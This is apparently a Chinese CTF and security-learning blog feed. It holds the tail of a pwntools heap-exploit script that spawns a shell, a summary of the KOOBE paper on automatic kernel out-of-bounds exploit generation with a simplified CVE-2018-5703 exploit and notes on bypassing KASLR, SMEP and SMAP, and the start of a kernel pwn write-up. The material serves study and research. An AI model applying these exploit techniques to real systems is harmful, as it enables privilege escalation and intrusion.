class="line">pay = p64(data_addr) + p64(<span class="number">0x1000000</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1eb6a0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1ea980</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(libc_base+<span class="number">0x1eb5c0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">edit(<span class="number">-5</span>,pay)</span><br><span class="line">super_buy(p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>可以利用乘法溢出修改money</p><p>使用mmap进行calloc时，不会进行memset，因此可以泄露libc</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>论文阅读之KOOBE</title>
      <link href="/2020/05/18/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E4%B9%8BKOOBE/"/>
      <url>/2020/05/18/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E4%B9%8BKOOBE/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>题目：<strong>KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-BoundsWrite Vulnerabilities</strong></p><p>会议：<strong>USENIX Security ‘20 Summer Quarter Accepted Papers</strong></p><p>链接：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng" target="_blank" rel="noopener">https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng</a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>KOOBE：Kernel Out-Of-Bound Exploit（内核越界漏洞利用），本文研究的是内核堆内存的越界。</p><p>内核保护着操作系统的基础架构，不幸的是，一些内核例如linux内核是用C写的，由于C语言自身的属性会导致一些内存相关漏洞频发。</p><p>2006-2018：已修复的安全bug中70%与内存相关。攻击者可以利用这些漏洞进行提权进而获取整个系统的控制权。</p><p>syzbot：<a href="https://syzkaller.appspot.com/upstream，Linux内核fuzzing的bug显示。" target="_blank" rel="noopener">https://syzkaller.appspot.com/upstream，Linux内核fuzzing的bug显示。</a></p><p>2017.8-2018.9：1216个linux内核漏洞被 syzkaller 发现，平均每天3.42个。毫无疑问会给开发者带来很大的工作量。而这些漏洞有些可以很容易提权，有些则无足轻重，因此需要将这些分开，即给这些bug设定优先级。其中一个办法是利用PoC自动生成一般的内存漏洞利用脚本从而对这些可以利用的漏洞进行评估。当然，内核漏洞不止一种，可以分而治之，UAF漏洞的工作已经有了一定的成果（Fuze），本文研究的是OOB。</p><p>OOB：内核越界访问，本文研究的是内核堆内存</p><p>挑战：不同的OOB所表现的利用能力(Capability)不同。PoC不能展示所有的漏洞。</p><p>Capability: how far, how many, what value</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-6187 can overwrite only one single byte(off by one)</span><br><span class="line">CVE-2017-7184 can write more bytes but only the same fixed value</span><br></pre></td></tr></table></figure><p>内存属性：函数指针，结构体指针，具体的值等等</p><p>本文主要工作：给OOB漏洞分级，自动生成Expliot（AEG）</p><p>本文主要贡献：</p><ol><li>KOOBE可以提取OOB这一类型漏洞的Capability</li><li>代码开源(<a href="https://github.com/seclab-ucr/KOOBE)，可供研究" target="_blank" rel="noopener">https://github.com/seclab-ucr/KOOBE)，可供研究</a></li><li>测试了已知CVE和syzbot上的bug，证明了有效性，有助于开发exploit</li></ol><h3 id="范围和假设"><a href="#范围和假设" class="headerlink" title="范围和假设"></a>范围和假设</h3><h4 id="研究范围"><a href="#研究范围" class="headerlink" title="研究范围"></a>研究范围</h4><p>AEG（Automatic exploit generation）在linux内核的应用具有挑战性。KOOBE专注于性能提取(capability ex-traction )和漏洞评估( exploitability evaluation),这是本文开发堆OOB漏洞的Exploit的关键步骤。给定PoC，触发一个或多个OOB访问，KOOBE生成Exploit从而达到指令指针（IP）劫持。</p><h4 id="假设-攻击模型"><a href="#假设-攻击模型" class="headerlink" title="假设(攻击模型)"></a>假设(攻击模型)</h4><p>内核被常用的保护机制所保护。</p><p>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)</p><p>SMEP： Supervisor Mode Execution Prevention，禁止内核执行用户空间代码</p><p>SMAP： Supervisor  Mode  Access  Prevention，禁止内核访问用户空间</p><p>当我们劫持IP之后，这些都可以绕过。</p><p>ret2dir：Rethinking kernel isolation，可以绕过SMEP和SMAP</p><p>From collision to exploitation: Unleashing use-after-free vulnerabilitiesin linux kernel</p><p>KEPLER ：无条件地自动将IP控制转化为任意代码执行。</p><h3 id="背景和示例"><a href="#背景和示例" class="headerlink" title="背景和示例"></a>背景和示例</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>内核OOB漏洞的危害性巨大，实际中内核OOB的研究是一项劳动密集型任务，手动分析花费很多精力还不一定奏效，接下来通过实例详细描述一下OOB漏洞。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>CVE-2018-5703：Linux Kernel 4.14.0 ,简化如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type1</span> &#123;</span> ...;                               &#125;;</span><br><span class="line"><span class="number">2.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type2</span> &#123;</span> Type1 sk; <span class="keyword">uint64_t</span> option; ...;    &#125;;</span><br><span class="line"><span class="number">3.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type3</span> &#123;</span> <span class="keyword">int</span> (*ptr)(); ...;                 &#125;;</span><br><span class="line"><span class="number">4.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type4</span> &#123;</span> <span class="keyword">uint64_t</span> state;  Type3 *sk; ...;   &#125;;</span><br><span class="line"><span class="number">5.</span>  <span class="class"><span class="keyword">struct</span> <span class="title">Type5</span> &#123;</span> <span class="keyword">atomic_t</span> refcnt; ...;              &#125;;</span><br><span class="line"><span class="number">6.</span>  Type2 gsock = &#123; ..., .option = <span class="number">0x08080000000000</span>,  &#125;;</span><br><span class="line"><span class="number">7.</span>  Type1 * vul = <span class="literal">NULL</span>; Type3 * tgt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">8.</span>  <span class="function"><span class="keyword">void</span> <span class="title">sys_socket</span><span class="params">()</span>  <span class="comment">//sizeof(Type1) == sizeof(Type3)</span></span></span><br><span class="line">9.    vul = kmalloc(sizeof(Type1))</span><br><span class="line"><span class="number">10.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_accept</span><span class="params">()</span></span></span><br><span class="line">11.   vul = (Type2*)vul;          //type confusion</span><br><span class="line"><span class="number">12.</span>   vul-&gt;option = gsock.option; <span class="comment">//Vulnerability Point</span></span><br><span class="line"><span class="number">13.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_setsockopt</span><span class="params">(val)</span> <span class="comment">//not invoked in given PoC</span></span></span><br><span class="line">14.   if (val == -1) return;</span><br><span class="line"><span class="number">15.</span>   gsock.option = val;</span><br><span class="line"><span class="number">16.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_create_tgt</span><span class="params">()</span></span></span><br><span class="line">17.   tgt = kmalloc(sizeof(Type3)); </span><br><span class="line"><span class="number">18.</span>   tgt-&gt;ptr = <span class="literal">NULL</span>;           <span class="comment">//init ptr</span></span><br><span class="line"><span class="number">19.</span> <span class="function"><span class="keyword">void</span> <span class="title">sys_deref</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span> (tgt-&gt;ptr) tgt-&gt;ptr(); &#125;</span><br></pre></td></tr></table></figure><p>漏洞点：line 12，使用ＫＡＳＡＮ发现</p><p>vulnerable object: 漏洞点</p><p>target object: OOB区域</p><p>漏洞形成: line 11 -&gt; line 12</p><p>咋一看: 好像只能越界写0x08080000000000, 该地址既不属于内核空间也不属于用户空间</p><p>再一看: 如果sys_setsockopt()被调用,则可以写任意值(PoC中并未提及,限制漏洞的可利用性, 无公开Exploit)</p><p>实际情况: 该漏洞没有公开的exploit,大概是fuzzing发现了咋一看的bug就没有继续进行下去。再一看的漏洞正是本文的KOOBE发现的,并自动生成了可以利用的exploit, 下一章的第三节会详细讲述如何发现的。</p><p>exploit简化如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="number">2.</span>    sys_create_tgt(); <span class="comment">// cache exhaustion </span></span><br><span class="line"><span class="number">3.</span>  sys_socket();       <span class="comment">// vuln obj</span></span><br><span class="line"><span class="number">4.</span>  sys_create_tgt();   <span class="comment">// target obj</span></span><br><span class="line"><span class="number">5.</span> sys_setsockopt(<span class="number">0xdeadbeef</span>);    </span><br><span class="line"><span class="number">6.</span>  sys_accept();       <span class="comment">// tgt-&gt;ptr = 0xdeadbeef</span></span><br><span class="line"><span class="number">7.</span>  sys_deref()</span><br></pre></td></tr></table></figure><p>利用过程分为四步:</p><p><img alt="image-20200518175655179" style="zoom: 50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200518175655179.png" class="lazyload"></p><h5 id="性能概要"><a href="#性能概要" class="headerlink" title="性能概要"></a>性能概要</h5><p>大部分的漏洞是Fuzzing发现，该漏洞的PoC可以破坏一些内存但是还没达到可利用的层次。因此，此时该漏洞的性能等级较低。KOOBE首先会根据PoC进行性能探测(计算当前性能和探测更高级的性能)。</p><h5 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h5><p>Linux内核使用的是 slab/slub 分配器，根据size分配相匹配大小的chunk(相同的size所分配的chunk大小相同，例如type1和type3)。被释放的chunk会在堆cache中,因此为了是vulnerable object和target object相邻，首先通过堆喷将堆cache中的内存耗尽。见exploit line1-4。</p><h5 id="选择目标对象-target-object"><a href="#选择目标对象-target-object" class="headerlink" title="选择目标对象(target object)"></a>选择目标对象(target object)</h5><p>通过前面的性能概要发现更高级的漏洞，并且布置好了堆内存。下面就需要选择攻击的目标并且写好payload，通常我们可以把攻击目标分成几种:</p><ol><li><p>函数指针，见type3，可以直接控制程序流</p></li><li><p>数据指针，见type4，可以覆写结构体</p></li><li><p>非指针:需要具体讨论</p><ul><li>uid，写成0直接提权</li><li>reference counter: 减少可以造成UAF，见type5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reference counter机制</span><br><span class="line">一个对象可以有多个owner，该计数器保存了程序中该对象有几个owner的信息。</span><br><span class="line">当对该实例的reference counter变为0，也就是没有owner时，dealloc将被调用，以释放该实例内存。</span><br></pre></td></tr></table></figure></li></ol><p>这里选择type3，size同vulnerable object。由此看来，收集不同的target object是很有必要的。</p><p>例如:CVE-2016-6778</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">example1</span><span class="params">(size)</span></span></span><br><span class="line"><span class="function">vul </span>= kmalloc(size);</span><br><span class="line">vul[size] = ’\<span class="number">0</span>’;</span><br></pre></td></tr></table></figure><p>明显的off by null漏洞,，这时候如果target object为函数指针就没无法像上面一样控制整个指针，这时候选择RC作为target object就比较合适，因为低字节清零一般会减少RC的值从而使该内存提前释放造成UAF。</p><p>在Linux内核中，可以找到2000多个潜在的target object。收集这些object将有助于自动生成exploit。</p><h5 id="exploit合成"><a href="#exploit合成" class="headerlink" title="exploit合成"></a>exploit合成</h5><p>基于target object调整PoC进而合成exploit。在这个过程，,我们需要绕过高级检测来达到任意代码执行。</p><p>类似KASLR、SMAP、SMEP只会让攻击复杂化而不能完全防止攻击。下面简要介绍这三种防护的绕过：</p><p>KASLR：信息泄露</p><p>SMEP：ROP/JOP</p><p>SMAP：physmap spray，用户空间内存映射到physmap，内核可直接访问physmap</p><p>最后利用KEPLER把IP劫持转化成任意代码执行。</p><p>KEPLER: Facilitating control-flow hijacking primitive eval-uation for linux kernel vulnerabilities</p><h3 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h3><p>we  describe  the overview of KOOBE, a novel framework to extract the capabilities of heap OOB-based vulnerabilities and assess their exploitability.</p><p><img alt="image-20200518194836602" data-src="/2020/05/18/论文阅读之KOOBE/image-20200518194836602.png" class="lazyload"></p><p>首先进行漏洞分析，利用符号跟踪(symbolic tracing)来总结PoC的性能(capability)，然后利用一个或更多的target object来自动确定是否可以利用，如果不能，将触发性能探测(Capability Exploration)来发现新的PoC，然后对新PoC进行分析，直到找到可利用的target object或者timeout。最后利用PoC生成exploit。</p><h4 id="漏洞分析-Vulnerable-Analysis"><a href="#漏洞分析-Vulnerable-Analysis" class="headerlink" title="漏洞分析(Vulnerable Analysis)"></a>漏洞分析(Vulnerable Analysis)</h4><p>给定PoC，KOOBE尝试发现漏洞点(OOB访问处)以及相应的漏洞对象，如下所示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123; “vuln_obj”: &#123;    </span><br><span class="line">    “size”: 256, // Concrete value of the size    </span><br><span class="line">     // The address of the function call allocating the object    </span><br><span class="line">    “callsite”: 0xffffffff811f18d0 &#125;,  </span><br><span class="line"> “KASAN reports”: [&#123;      </span><br><span class="line"> // call chain to the KASAN report function      </span><br><span class="line"> “backtrace”: [0xffffffff814b56a6, 0xffffffff81477763],      </span><br><span class="line">“length”: 1  </span><br><span class="line">&#125;]&#125;</span><br></pre></td></tr></table></figure><p>KASAN： Kernel Address Sanitizer 的缩写，它是一个动态检测内存错误的工具，主要功能是检查内存越界访问和使用已释放的内存等问题。KASAN可以检测的内存异常包括：slab-out-of-bounds/user-after-free/stack-out-of-bounds/global-out-of-bounds等。基于影子内存(shadow memory)和红色区域(red zones)<br><img alt="" data-src="/2020/05/18/论文阅读之KOOBE/1.png" class="lazyload"></p><p>缺陷：</p><ol><li>无法提供所有的OOB，例如，OOB 访问绿色区域。</li><li>无法准确指出漏洞对象，大部分都指在红色区域</li></ol><p>KOOBE方案：符号追踪结合KASAN，例如： CVE-2017-7184</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">example2</span><span class="params">(i)</span>  </span></span><br><span class="line"><span class="function">vul </span>= (<span class="keyword">char</span>*)kmalloc(<span class="keyword">sizeof</span>(TYPE));  <span class="comment">//omit other OOB points on the path  </span></span><br><span class="line">vul[i/<span class="number">8</span>] |= <span class="number">1</span>&lt;&lt;(i&amp;<span class="number">0x7</span>);<span class="comment">//set 1 bit</span></span><br></pre></td></tr></table></figure><p>将vul和i都进行符号化，分析符号表达式vul+i/8有可能大于sizeof(TYPE)并且i没有约束时可以确定这是一个漏洞点。</p><h4 id="性能概要-Capability-Summarization"><a href="#性能概要-Capability-Summarization" class="headerlink" title="性能概要(Capability Summarization)"></a>性能概要(Capability Summarization)</h4><p>Capability：在本文中，capability表示OOB写的能力，为了量化它，本文做出以下定义：</p><h5 id="Definition-1-OOB-write-set"><a href="#Definition-1-OOB-write-set" class="headerlink" title="Definition 1 OOB write set"></a>Definition 1 OOB write set</h5><p>E：符号执行引擎所支持的所有符号表达式</p><p>P：所有路径</p><p>Np：可以触发漏洞的路径</p><p>Tp={(offpi,lenpi,valpi)|i∈Np∧off,len,val∈E}：OOB可写集</p><p>off：how far</p><p>len：how many</p><p>val：what value</p><p>Tpi：OOB可写集的个例</p><p>for循环：抽象成一次OOB write</p><h5 id="Definition-2-Capability"><a href="#Definition-2-Capability" class="headerlink" title="Definition 2 Capability"></a>Definition 2 Capability</h5><p>Cp={sizep,Tp,f(p)|sizep∈E}：路径p的性能</p><p>size：漏洞对象的大小，size的大小有关target object的个数</p><p>f(p):：执行时p的路径约束,例如：line 14 -&gt; line 15</p><p>In the motivating example, the capability corresponding tothe original PoC can be expressed as:</p><p>Corig={sizeof(Type1),{(offsetof(Type2,option),8,0x08080000000000)},/0}(1)</p><p>while the complete capability should be:</p><p>Ccomp={sizeof(Type1),{(offsetof(Type2,option),8,val)},{val!=−1}}(2)</p><p>when ‘sys_setsockopt’ is invoked before triggering the vul-nerability point.</p><h5 id="Definition-3-Capability-Comparison"><a href="#Definition-3-Capability-Comparison" class="headerlink" title="Definition 3 Capability Comparison"></a>Definition 3 Capability Comparison</h5><p>∀e1,e2∈E, e1&lt;=e2 if e1 is identical to e2 or e1is a constant whose value can be taken in e2</p><p>∀p1,p2∈P, Tp1i&lt;=Tp2i if offp1i&lt;=offp2i ∧ lenp1i&lt;=lenp2i ∧ valp1i&lt;=valp2i</p><p>∀p1,p2∈P, Cp1&lt;=Cp2 if sizep1&lt;=sizep2 ∧ ∀i∈Np1 Tp1i&lt;=Tp2i</p><p>因此：Corig &lt; Ccomp</p><h5 id="Capability-Generation"><a href="#Capability-Generation" class="headerlink" title="Capability Generation"></a>Capability Generation</h5><p>函数调用：例如memcpy，解决循环问题</p><p>直接访问</p><p>memcpy(a1,a2,a3)</p><p>a1：目的地址，提取出off</p><p>a2：源地址，提取出al</p><p>a3：长度，作为len</p><h4 id="性能探测-Capability-Exploration"><a href="#性能探测-Capability-Exploration" class="headerlink" title="性能探测(Capability Exploration)"></a>性能探测(Capability Exploration)</h4><p>通常，一个漏洞在不同的出发路径上有不同的漏洞点，不同的漏洞点有不同的性能。甚至不同路径触发的相同漏洞点也有不同的性能（如示例）。一般的PoC只有一条触发路径，因此我们需要触发新的路径来扩展性能或者产生新的性能。本文提出一种 capability-guided fuzzing方案来探索新的性能。</p><h5 id="Capability-Guided-Fuzzing"><a href="#Capability-Guided-Fuzzing" class="headerlink" title="Capability-Guided  Fuzzing"></a>Capability-Guided  Fuzzing</h5><p> Syzkaller ：基于覆盖反馈，探索新路径而无法探索新性能</p><p>输入：PoC，Cp</p><p>方法：突变种子，在覆盖反馈的同时计算Cp，并利用Cp进行反馈(触发OOB)</p><p>重点：种子过滤。例如：当value任意时，其它只关于value的种子可以丢弃。</p><h4 id="可利用性评估-Exploitability-Evacuation"><a href="#可利用性评估-Exploitability-Evacuation" class="headerlink" title="可利用性评估(Exploitability Evacuation)"></a>可利用性评估(Exploitability Evacuation)</h4><p>目标约束：target object可以利用的条件，例如：指针必须指向有效地址空间，target object的大小等于vulnerable object 如果利用堆风水(不是必须，为了稳定)。</p><p>然后把目标约束和Cp丢进约束求解器进行求解，无解则换下一个目标。具体过程如下：</p><p><img alt="image-20200519202330625" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519202330625.png" class="lazyload"></p><p>示例的可利用性评估如下：</p><p><img alt="image-20200519202920748" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519202920748.png" class="lazyload"></p><h5 id="性能构成"><a href="#性能构成" class="headerlink" title="性能构成"></a>性能构成</h5><p>同一性能可以重复利用，如CVE-2017-7184，一个OOB可能有多个性能，解决方案-贪心算法，具体如下：</p><p><img alt="image-20200519205742821" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519205742821.png" class="lazyload"></p><p>相关定义：</p><p><img alt="image-20200519205639204" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519205639204.png" class="lazyload"></p><h4 id="可利用基元生成-Exploit-Primitive-Synthesis"><a href="#可利用基元生成-Exploit-Primitive-Synthesis" class="headerlink" title="可利用基元生成(Exploit Primitive Synthesis)"></a>可利用基元生成(Exploit Primitive Synthesis)</h4><p>堆喷，堆风水</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Syskaller：内核fuzz，主要用在性能探测和利用脚本生成</p><p>S2E：二进制符号执行框架，主要用在性能概要和可利用性评估</p><p>angr：二进制符号执行分析引擎，主要用在漏洞分析</p><p>细节如下：</p><h4 id="动态插桩来实现-Capability-Guided-Fuzzing"><a href="#动态插桩来实现-Capability-Guided-Fuzzing" class="headerlink" title="动态插桩来实现 Capability-Guided Fuzzing"></a>动态插桩来实现 Capability-Guided Fuzzing</h4><p>利用QEMU模式的Syskaller和S2E来进行CGF，Syskaller可以监测内核的内部状态而进行non-crashing fuzzing，避免KASAN的警告来保证持续fuzz（跳过但是记录导致OOB的指令）。缺点是这样可能产生误报导致一些假阳性的漏洞点或者性能。</p><h4 id="可支持的符号长度"><a href="#可支持的符号长度" class="headerlink" title="可支持的符号长度"></a>可支持的符号长度</h4><p>在可利用性评估中，我们主要考虑三个参数off，len，value并且将它们符号化。相较于符号索引来说，符号执行引擎对符号长度的支持不太友好。</p><p>解决方案：利用KLEE和Z3对长度进行迭代约束求解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in [0, 10]:</span><br><span class="line">M[ite(i &lt;len, i+off, offsetdummy)] =val[i]</span><br><span class="line">其中ite表示if-then-else</span><br></pre></td></tr></table></figure><h4 id="循环中的性能提取"><a href="#循环中的性能提取" class="headerlink" title="循环中的性能提取"></a>循环中的性能提取</h4><p>循环会将阻塞符号执行(fuzzification好像有利用这个方法来阻塞DTA)，因为隐式数据流。</p><p>SAGE：循环引导和模式匹配</p><p>Angr：静态分析</p><h4 id="处理符号索引和循环边界来解决路径冲突"><a href="#处理符号索引和循环边界来解决路径冲突" class="headerlink" title="处理符号索引和循环边界来解决路径冲突"></a>处理符号索引和循环边界来解决路径冲突</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">(n)</span><span class="comment">//n = 64</span></span></span><br><span class="line">2.   vul = (char*)kmalloc(32);</span><br><span class="line"><span class="number">3.</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="number">4.</span>     vul[i] = <span class="number">0</span>;<span class="comment">//OOB Point</span></span><br></pre></td></tr></table></figure><p>处理方案：消除不必要的约束</p><h4 id="松懈不必要的约束"><a href="#松懈不必要的约束" class="headerlink" title="松懈不必要的约束"></a>松懈不必要的约束</h4><p>由于内核的复杂性，复杂的路径约束通常导致约束求解器无法再timeout前完成求解。一些无关的约束可以被松懈或直接忽略。</p><h4 id="目标收集"><a href="#目标收集" class="headerlink" title="目标收集"></a>目标收集</h4><p>总共收集2615个目标</p><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>数据集：7个CVE+10个Syzbot bug</p><p>Ubuntu 16.04 、16G RAM 、Intel(R) Core i7-7700K CPU @ 4.20GHz* 8.</p><h4 id="IP劫持基元-IP-Hijacking-Primitives"><a href="#IP劫持基元-IP-Hijacking-Primitives" class="headerlink" title="IP劫持基元(IP-Hijacking Primitives)"></a>IP劫持基元(IP-Hijacking Primitives)</h4><p><img alt="image-20200519214951103" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519214951103.png" class="lazyload"></p><p>EXP：19 ：5，6个新增，其中4个非CVE</p><h4 id="约束松懈-Constraint-Relaxation"><a href="#约束松懈-Constraint-Relaxation" class="headerlink" title="约束松懈(Constraint Relaxation)"></a>约束松懈(Constraint Relaxation)</h4><p><img alt="image-20200519220243790" style="zoom:50%;" data-src="/2020/05/18/论文阅读之KOOBE/image-20200519220243790.png" class="lazyload"></p><h4 id="实例学习-Case-Studies"><a href="#实例学习-Case-Studies" class="headerlink" title="实例学习(Case Studies)"></a>实例学习(Case Studies)</h4><h4 id="时间消耗-Time-Cost"><a href="#时间消耗-Time-Cost" class="headerlink" title="时间消耗(Time Cost)"></a>时间消耗(Time Cost)</h4><h3 id="讨论和未来工作"><a href="#讨论和未来工作" class="headerlink" title="讨论和未来工作"></a>讨论和未来工作</h3><ol><li>本文讨论的时OOB，可以扩展到其他类型的漏洞</li><li>KOOBE还可以继续优化</li></ol><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><h4 id="漏洞点发现"><a href="#漏洞点发现" class="headerlink" title="漏洞点发现"></a>漏洞点发现</h4><p>动态内存防护措施：KASAN，Valgrind，ASan，MSan等</p><p>解决方案 ：结合KASAN和符号追踪(污点跟踪和内存探测的超集)</p><h4 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h4><p>基于覆盖反馈：AFL，Syzkaller，Honggfuzz</p><p>结合静态和动态分析的覆盖反馈：Vuzzer</p><p>基于梯度下降搜索： Angora</p><p>类神经网络：Neuzz</p><p>输入状态：Redqueen</p><p>Revery: From proof-of-concept toexploitable</p><h4 id="AEG"><a href="#AEG" class="headerlink" title="AEG"></a>AEG</h4><p>相关技术：符号执行以及混合符号执行</p><p>用户程序：</p><p>APEG：Automatic patch-based exploit genera-tion is possible: Techniques and implications</p><p>Automatic generation  of control flowhijacking exploits for software vulnerabilities. </p><p>Modular synthesis of heap exploits：Windows heap management</p><p> Gollum: Modular and greybox exploit generation for heapoverflows in interpreters</p><p>Towardsautomated generation of exploitation primitives for webbrowsers</p><p>内核：</p><p>Unleash-ing use-before-initialization vulnerabilities in the linuxkernel using targeted stack spraying</p><p>Fuze: Towards facilitating exploitgeneration for kernel use-after-free vulnerabilities.</p><p>Q: Exploit hardening made easy：需要给定任意地址写或者IP劫持基元</p><p>Block oriented programming: Au-tomating data-only attacks</p><p> KEPLER: Facilitating control-flow hijacking primitive eval-uation for linux kernel vulnerabilities</p><p>Heaphopper: Bringing bounded model checking toheap implementation security</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>kernel pwn(one)</title>
      <link href="/2020/04/16/kernel-pwn-one/"/>
      <url>/2020/04/16/kernel-pwn-one/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>是时候学习一下内核pwn了，内核pwn涉及内核以及文件系统的编译，这些类容留到以后再讲，这里先通过几道例题直观感受一下内核pwn。</p><h3 id="babyhacker"><a href="#babyhacker" class="headerlink" title="babyhacker"></a>babyhacker</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>题目附件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker tree -L 1       </span><br><span class="line">.</span><br><span class="line">├── babyhacker.ko</span><br><span class="line">├── bzImage</span><br><span class="line">├── initramfs.cpio</span><br><span class="line">├── startvm.sh</span><br></pre></td></tr></table></figure><p>查看启动脚本starvm.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stty intr ^]</span></span><br><span class="line"><span class="comment">#cd `dirname $0`</span></span><br><span class="line"><span class="comment">#timeout --foreground 15 </span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -s \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>开启了kaslr、smep、smap，本地调试可以去掉timeout和添加-s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker qemu-system-x86_64 --help |grep gdb</span><br><span class="line">-gdb dev        wait for gdb connection on &apos;dev&apos;</span><br><span 